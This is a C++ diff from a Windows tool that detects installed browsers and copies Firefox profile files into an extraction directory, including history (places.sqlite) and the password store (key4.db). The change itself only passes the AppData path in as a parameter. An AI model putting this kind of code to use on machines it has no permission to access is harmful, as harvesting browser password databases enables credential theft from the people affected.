@@ -18,7 +18,7 @@
 namespace fs = std::filesystem;
 
 bool verify_browser_installation(const LPCWSTR p_name);
-void collect_firefox_data(std::string p_path_to_extraction_directory);
+void collect_firefox_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata);
 void collect_chrome_data(std::string p_path_to_extraction_directory);
 void collect_edge_data(std::string p_path_to_extraction_directory);
 
@@ -29,6 +29,7 @@ std::string get_local_appdata_path();
 
 int main(int argc, char** argv) {
 	std::string path_to_extraction_directory = create_extraction_directory();
+	std::string path_to_appdata = get_local_appdata_path();
 
 	// Firefox
 	if (verify_browser_installation(L"Software\\Mozilla\\Firefox"))
@@ -37,7 +38,7 @@ int main(int argc, char** argv) {
 			convert_to_wchar((path_to_extraction_directory + "\\Firefox").c_str()), 
 			NULL
 		);
-		collect_firefox_data(path_to_extraction_directory + "\\Firefox");
+		collect_firefox_data((path_to_extraction_directory + "\\Firefox"), path_to_appdata);
 	}
 
 	// Chrome
@@ -114,10 +115,10 @@ bool verify_browser_installation(const LPCWSTR p_name) {
 	return false;
 }
 
-void collect_firefox_data(std::string p_path_to_extraction_directory) {
-	std::string path_to_appdata = get_local_appdata_path();
-	if (p_path_to_extraction_directory != "" && path_to_appdata != "") {
-		std::string path_to_profiles = path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
+void collect_firefox_data(std::string p_path_to_extraction_directory, std::string p_path_to_appdata) {
+	// std::string p_path_to_appdata = get_local_appdata_path();
+	if (p_path_to_extraction_directory != "" && p_path_to_appdata != "") {
+		std::string path_to_profiles = p_path_to_appdata + "\\Mozilla\\Firefox\\Profiles";
 		std::vector<std::regex> regex_list = {
 			std::regex("(.*?)(places\\.sqlite)$"),	// Contains bookmarks, names of downloaded files, and websites visted
 			std::regex("(.*?)(key4\\.db)$"),			// Passwords
